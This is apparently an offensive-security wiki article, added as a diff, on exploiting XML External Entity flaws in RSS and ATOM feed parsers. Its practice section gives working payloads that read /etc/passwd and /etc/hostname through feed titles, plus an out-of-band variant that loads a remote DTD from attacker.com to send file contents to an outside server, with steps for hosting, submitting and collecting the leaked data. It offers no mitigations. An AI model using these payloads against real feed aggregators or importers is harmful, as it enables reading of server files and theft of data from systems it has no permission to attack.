@@ -1,0 +1,120 @@
+---
+title: Exploiting XXE in RSS and ATOM Feeds
+description: Learn to exploit XXE vulnerabilities in RSS/ATOM feeds for sensitive
+  data disclosure.
+keywords:
+- XXE exploitation
+- RSS feed
+- ATOM feed
+- XML External Entities
+- data disclosure
+- feed parser vulnerabilities
+- sensitive data
+---
+
+# XXE Inside RSS/ATOM Feeds
+
+## Context
+
+The objective of this article is to demonstrate the exploitation of XML External Entity (XXE) vulnerabilities within RSS and ATOM feed files. By leveraging these vulnerabilities, an attacker can achieve sensitive data disclosure or remote file retrieval through feed-consuming applications. It is assumed that the reader is already familiar with XML structure and parsing, the RSS and ATOM feed formats, and general concepts surrounding XML External Entity (XXE) exploitation.
+
+## Theory
+
+### RSS/ATOM Feeds as XML Attack Surfaces
+
+RSS and ATOM feeds are XML-based syndication formats that are widely used for content distribution. Feed parsers, which are responsible for processing these external XML inputs, often lack adequate restrictions on entity resolution. This can lead to vulnerabilities in applications that consume these feeds. When feed consumers are improperly configured, they may inadvertently resolve external entities. This can potentially expose local files or internal resources.
+
+### Attack Vectors in Feed Consumption Workflows
+
+The attack sequence typically involves an attacker crafting a malicious RSS or ATOM feed embedded with an XXE payload. Once the victim application fetches and parses this feed, the entity is resolved, thus opening the door to exploitation. The data flow goes as follows: a malicious feed is created, which is then captured by a feed aggregator or news reader. An XML parser processes the data, resolving entities, and ultimately leading to data exfiltration. Applications generally operate on a trust assumption that external feeds are well-formed and benign, making them susceptible to XXE vulnerabilities.
+
+### Common Targets and Impact
+
+Typical targets for XXE attacks in this realm include feed aggregators, news readers, and backend importers. If successful, such attacks can result in the disclosure of sensitive files, Server-Side Request Forgery (SSRF), or even remote code execution, depending on the parser's configuration.
+
+## Practice
+
+### Injecting XXE Payload into RSS Feed
+
+To exploit an XXE vulnerability within an RSS feed:
+
+1. Create a malicious RSS feed with an external entity referencing a sensitive file:
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE rss [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+    ]>
+    <rss version="2.0">
+      <channel>
+        <title>&xxe;</title>
+        <link>http://example.com/</link>
+        <description>Malicious RSS Feed</description>
+      </channel>
+    </rss>
+    ```
+
+2. Host the malicious feed on a web server that is accessible to the target application.
+3. Submit or import the feed URL into the targeted feed aggregator or news reader.
+4. Monitor the application to capture exfiltrated file contents or to detect error messages containing sensitive data.
+
+When executed correctly, this approach can lead to sensitive file contents, such as `/etc/passwd`, being disclosed through feed parsing.
+
+### Injecting XXE Payload into ATOM Feed
+
+The steps for injecting an XXE payload into an ATOM feed are similar:
+
+1. Craft a malicious ATOM feed with an external entity referencing a local file:
+    ```xml
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE feed [
+      <!ENTITY xxe SYSTEM "file:///etc/hostname" >
+    ]>
+    <feed xmlns="http://www.w3.org/2005/Atom">
+      <title>&xxe;</title>
+      <link href="http://example.com/"/>
+      <updated>2024-06-01T12:00:00Z</updated>
+      <author><name>Attacker</name></author>
+      <id>urn:uuid:1234</id>
+    </feed>
+    ```
+
+2. Serve this ATOM feed from a location that the target application can access.
+3. Trigger the target application to fetch and parse the ATOM feed by submitting the feed URL.
+4. Look for file content leakage in the application's output or logs.
+
+Successfully performed, this method exposes local file contents via ATOM feed parsing.
+
+### Out-of-Band (OOB) XXE via RSS/ATOM Feed
+
+This technique involves exfiltrating data to an attacker-controlled server:
+
+1. Construct a malicious RSS feed using a remote DTD to exfiltrate file contents:
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE rss [
+      <!ENTITY % file SYSTEM "file:///etc/hostname" >
+      <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd" >
+      %dtd;
+    ]>
+    <rss version="2.0">
+      <channel>
+        <title>OOB XXE</title>
+        <link>http://example.com/</link>
+        <description>OOB XXE Test</description>
+      </channel>
+    </rss>
+    ```
+
+2. Host `exfil.dtd` on your server to receive data:
+    - Ensure your server is prepared to log or capture the incoming exfiltrated data.
+
+3. Submit the feed to the target application.
+4. Monitor your server for any incoming requests that contain exfiltrated data.
+
+This approach enables the exfiltration of sensitive data to an external server through Out-of-Band XXE.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **Python HTTP server**
